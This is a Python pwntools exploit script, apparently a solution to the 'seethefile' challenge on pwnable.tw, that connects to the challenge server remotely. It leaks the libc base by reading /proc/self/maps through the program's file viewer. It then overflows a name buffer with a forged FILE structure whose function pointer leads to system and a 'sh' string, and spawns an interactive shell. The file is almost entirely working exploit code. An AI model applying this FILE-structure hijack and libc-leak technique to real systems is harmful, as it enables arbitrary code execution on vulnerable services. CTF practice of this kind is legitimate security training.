from pwn import *
import re

def p32(d):
    return d.to_bytes(4, "little")

bin     = elf.ELF("./seethefile")
libc    = elf.ELF("./libc_32.so.6")
#libc    = elf.ELF("/lib/i386-linux-gnu/libc.so.6")

#r = process("./seethefile")
#r = process(argv="gdbserver --no-disable-randomization localhost:1234 ./seethefile".split(" "))
r=remote("chall.pwnable.tw", port=10200)

def read(times):
    result = b""
    for _ in range(times):
        r.recvuntil("choice :")
        r.sendline("2")
        r.recvuntil("choice :")
        r.sendline("3")
        data = r.recvuntil("---------------MENU")
        result += data
    return result

r.recvuntil("choice :")
r.sendline("1")
r.recvuntil("see :")
r.sendline("/proc/self/maps")
procs = read(3).decode()
libc_leak = re.search("(f[a-z0-9]*)-f", procs).group(1)
print(libc_leak)
libc_base = int(libc_leak, 16)
libc_sys = libc_base + libc.symbols[b"system"] + 0x1000
libc_nullp = libc_base + libc.symbols[b"_null_auth"]

name = 0x0804B260
after = 0x0804B284
jump_to = libc_sys
print(hex(jump_to))
print(p32(jump_to))

binsh = b"//bin/sh"

file_struct = b"B" * 10 + b"||sh||" + b"B"*(72-10-6) + p32(libc_nullp) + p32(name - 0x8) * 10
payload = p32(jump_to) + b"A" * 28 + p32(after) + file_struct

r.sendline("5")
r.sendline(payload)
r.interactive()

#0xffffd1e0 + 12 is first 